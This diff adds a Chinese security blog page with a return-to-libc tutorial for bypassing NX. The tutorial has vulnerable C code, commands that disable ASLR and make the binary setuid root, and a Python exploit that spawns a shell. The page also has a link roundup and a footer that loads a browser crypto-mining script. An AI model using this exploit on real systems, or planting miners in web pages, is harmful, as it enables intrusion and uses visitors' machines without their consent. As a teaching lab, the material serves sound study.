+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/02/26/通过return-to-libc绕过NX-bit/" itemprop="url">
+                  通过return-to-libc绕过NX-bit
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-26T23:13:31+08:00">
+                2018-02-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
+<li>读此文章之前建议先读一下这篇文章<a href="https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">linux栈溢出学习笔记</a></li>
+<li>本次的测试环境是ubuntu14.04（X86).</li>
+<li>为了缓解攻击者的行为，专家们想出了一项缓解缓冲区溢出漏洞利用的措施叫做“NX Bit”.</li>
+<li>什么是NX(No-eXecute) Bit，<a href="https://www.wikiwand.com/en/NX_bit" target="_blank" rel="external">wiki</a>,它是一项让某个特定区域的内存代码变得不可执行不可修改的技术，例如，数据区域、栈空间和堆空间是不可执行的，代码区是不可写入的。当NX bit开启的时候，我们之前的缓冲区溢出利用将会失败，因为我们之前的shellcode会被复制到栈中然后我们的返回地址会被指向我们的shellcode从而执行我们的shellcode，但是自从栈中的代码不可以执行之后，我们的exploit会失败，但是这种缓解措施并不是一劳永逸的，因此这篇文章将介绍如何绕过NX Bit！<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> //vuln.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char* argv[]) &#123;</div><div class="line"> char buf[256]; /* [1] */ </div><div class="line"> strcpy(buf,argv[1]); /* [2] */</div><div class="line"> printf(&quot;%s\n&quot;,buf); /* [3] */</div><div class="line"> fflush(stdout);  /* [4] */</div><div class="line"> return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="编译指令"><a href="#编译指令" class="headerlink" title="编译指令"></a>编译指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</div><div class="line">$gcc -g -fno-stack-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<ul>
+<li>需要注意的是 当参数-z execstack 没有传入（默认没有）的时候，我们的NX bit是没有开起来的<br>我们可以通过readelf -l 命令来查看一下<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/readelf.png" alt=""></li>
+<li>可以看到栈空间只有RW的标志而没有E的标志。<h4 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h4></li>
+<li>攻击者可以使用“return-to-libc”的技巧来绕过NX bit，这里返回地址被一个特定的libc的函数地址所覆盖（而不是包含shellcode的栈空间地址），例如如果攻击者想要去得到一个shell，他可以使用system（）函数的地址去覆盖返回函数的地址，同时在栈中设置system需要的合适参数来供其成功的调用。</li>
+<li><p>漏洞利用代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. </div><div class="line">#For example system address = libc base address + system offset</div><div class="line">#where </div><div class="line">       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)</div><div class="line">       #system offset     = 0x0003f060 (obtained from &quot;readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system&quot;)</div><div class="line"></div><div class="line">system = 0xb7e52310       #0xb7e2000+0x0003f060</div><div class="line">exit = 0xb7e45260          #0xb7e2000+0x00032be0</div><div class="line"></div><div class="line">#system_arg points to &apos;sh&apos; substring of &apos;fflush&apos; string. </div><div class="line">#To spawn a shell, system argument should be &apos;sh&apos; and hence this is the reason for adding line [4] in vuln.c. </div><div class="line">#But incase there is0xb754b260 no &apos;sh&apos; in vulnerable binary, we can take the other approach of pushing &apos;sh&apos; string at the end of user input!!</div><div class="line">system_arg = 0xb7ffee11     #(obtained from hexdump output of the binary)</div><div class="line"></div><div class="line">#endianess conversion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack(&quot;&lt;I&quot;,num)</div><div class="line">buf = &quot;A&quot; * 268</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print &quot;Calling vulnerable program&quot;</div><div class="line">call([&quot;./vuln&quot;, buf])</div></pre></td></tr></table></figure>
+</li>
+<li><p>关于system和exit以及sh的查找可以使用如下的方法<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/findaddr.png" alt=""></p>
+</li>
+<li>最后执行上面的利用代码可以得到我们想要的shell，如下图<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/exp.png" alt=""><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/" target="_blank" rel="external">Bypassing NX bit using return-to-libc</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/02/23/20180223安全动态/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/02/23/20180223安全动态/" itemprop="url">
+                  20180223安全动态
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-23T13:54:25+08:00">
+                2018-02-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
+<li>Bug Bounty Web 漏洞挖掘的几个小 Tips<br><a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#104;&#116;&#116;&#112;&#115;&#x3a;&#47;&#47;&#109;&#x65;&#100;&#105;&#x75;&#x6d;&#46;&#x63;&#111;&#x6d;&#x2f;&#64;&#112;&#x72;&#x61;&#x74;&#x65;&#101;&#107;&#95;&#x30;&#x34;&#57;&#48;&#47;&#x62;&#117;&#103;&#x2d;&#98;&#x6f;&#x75;&#110;&#116;&#121;&#x2d;&#116;&#105;&#x70;&#115;&#45;&#x74;&#114;&#x69;&#x63;&#107;&#x73;&#x2d;&#x6a;&#115;&#x2d;&#x6a;&#x61;&#x76;&#97;&#x73;&#99;&#x72;&#x69;&#x70;&#x74;&#45;&#x66;&#105;&#x6c;&#x65;&#115;&#x2d;&#x62;&#100;&#x64;&#101;&#x34;&#x31;&#x32;&#101;&#x61;&#x34;&#x39;&#x64;">&#104;&#116;&#116;&#112;&#115;&#x3a;&#47;&#47;&#109;&#x65;&#100;&#105;&#x75;&#x6d;&#46;&#x63;&#111;&#x6d;&#x2f;&#64;&#112;&#x72;&#x61;&#x74;&#x65;&#101;&#107;&#95;&#x30;&#x34;&#57;&#48;&#47;&#x62;&#117;&#103;&#x2d;&#98;&#x6f;&#x75;&#110;&#116;&#121;&#x2d;&#116;&#105;&#x70;&#115;&#45;&#x74;&#114;&#x69;&#x63;&#107;&#x73;&#x2d;&#x6a;&#115;&#x2d;&#x6a;&#x61;&#x76;&#97;&#x73;&#99;&#x72;&#x69;&#x70;&#x74;&#45;&#x66;&#105;&#x6c;&#x65;&#115;&#x2d;&#x62;&#100;&#x64;&#101;&#x34;&#x31;&#x32;&#101;&#x61;&#x34;&#x39;&#x64;</a></li>
+<li>Linux ASLR 缓解措施的新绕过方法<br><a href="http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-techniques.html" target="_blank" rel="external">http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-techniques.html</a></li>
+<li>Linux 系统调用的过程剖析<br><a href="https://lwn.net/Articles/604287/" target="_blank" rel="external">https://lwn.net/Articles/604287/</a></li>
+<li>Windows 平台用户态 API 监控与代码注入的检测<br><a href="https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565" target="_blank" rel="external">https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565</a></li>
+<li>Google Service Management 服务 7.5K Bounty 奖金漏洞的分析<br><a href="https://sites.google.com/site/testsitehacking/-7-5k-Google-services-mix-up" target="_blank" rel="external">https://sites.google.com/site/testsitehacking/-7-5k-Google-services-mix-up</a></li>
+<li>挖洞经验 | 看我如何参加众测项目发现美国国防部网站的各类高危漏洞<br><a href="http://www.freebuf.com/articles/others-articles/162579.html" target="_blank" rel="external">http://www.freebuf.com/articles/others-articles/162579.html</a></li>
+<li>Docker 环境中的事件分析与取证<br><a href="https://static.ernw.de/whitepaper/ERNW_Whitepaper64_IncidentForensicDocker_signed.pdf" target="_blank" rel="external">https://static.ernw.de/whitepaper/ERNW_Whitepaper64_IncidentForensicDocker_signed.pdf</a></li>
+<li>Gaining root via UART<br><a href="http://konukoii.com/blog/2018/02/16/5-min-tutorial-root-via-uart/" target="_blank" rel="external">http://konukoii.com/blog/2018/02/16/5-min-tutorial-root-via-uart/</a></li>
+<li>Digging passwords in Linux swap<br><a href="http://blog.sevagas.com/?Digging-passwords-in-Linux-swap" target="_blank" rel="external">http://blog.sevagas.com/?Digging-passwords-in-Linux-swap</a></li>
+<li>我是如何在 bug bounty 项目中绕过双因素认证的<br><a href="http://c0d3g33k.blogspot.it/2018/02/how-i-bypassed-2-factor-authentication.html" target="_blank" rel="external">http://c0d3g33k.blogspot.it/2018/02/how-i-bypassed-2-factor-authentication.html</a></li>
+<li>Windows 主机中使用自带工具 Netsh 实现端口转发<br><a href="http://woshub.com/port-forwarding-in-windows/" target="_blank" rel="external">http://woshub.com/port-forwarding-in-windows/</a></li>
+<li>从 IoT 设备逆向的角度看小米 IoT 生态系统<br><a href="https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Reversing-IoT-Xiaomi-ecosystem.pdf" target="_blank" rel="external">https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Reversing-IoT-Xiaomi-ecosystem.pdf</a></li>
+<li>窃取 SSH credentials 的另一种方式<br><a href="https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html" target="_blank" rel="external">https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html</a></li>
+<li>Puszek - Linux kernel module rootkit<br><a href="https://github.com/Eterna1/puszek-rootkit" target="_blank" rel="external">https://github.com/Eterna1/puszek-rootkit</a></li>
+<li>JShell - Get a JavaScript shell with XSS<br><a href="https://github.com/UltimateHackers/JShell" target="_blank" rel="external">https://github.com/UltimateHackers/JShell</a></li>
+<li>ctf-pwn-tips<br><a href="https://github.com/Naetw/CTF-pwn-tips" target="_blank" rel="external">https://github.com/Naetw/CTF-pwn-tips</a></li>
+<li>honeytrap - 一款蜜罐框架<br><a href="https://github.com/honeytrap/honeytrap" target="_blank" rel="external">https://github.com/honeytrap/honeytrap</a></li>
+<li>Researcher Resources - How to become a Bug Bounty Hunter<br><a href="https://forum.bugcrowd.com/t/researcher-resources-how-to-become-a-bug-bounty-hunter/1102" target="_blank" rel="external">https://forum.bugcrowd.com/t/researcher-resources-how-to-become-a-bug-bounty-hunter/1102</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel sidebar-panel-active">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="M0rk" />
+          <p class="site-author-name" itemprop="name">M0rk</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">167</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/kevien" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/858012456" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://weibo.com/wuyanzu" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M0rk</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+<br>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<!--
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+-->
+<script type="text/javascript">
+!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/39357/kevien.github.io/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
+</script>
+
+<!--
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('uTu9h9LT1kVUk4O1UxyZAhd8uvoLLip5', {throttle: 0.3});
+
+  // Only start on non-mobile devices and if not opted-out
+  // in the last 14400 seconds (4 hours):
+  if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    miner.start();
+  }
+</script>
+-->
+
+
+<!--<script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="https://kevien.github.io/static/api/js/canvas-nest.min.js"></script>-->
+<script src="https://kevien.github.io/static/api/js/love.js"></script>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+     <!-- 来必力City版安装代码 -->
+     <!--
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yOTU4MS82MTQ5">
+        <script type="text/javascript">
+         (function(d, s) {
+             var j, e = d.getElementsByTagName(s)[0];
+
+             if (typeof LivereTower === 'function') { return; }
+
+             j = d.createElement(s);
+             j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+             j.async = true;
+
+             e.parentNode.insertBefore(j, e);
+         })(document, 'script');
+        </script>
+      <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+      </div>
+      -->
+<!-- City版安装代码已完成 -->
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      $('#local-search-input').focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === '') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
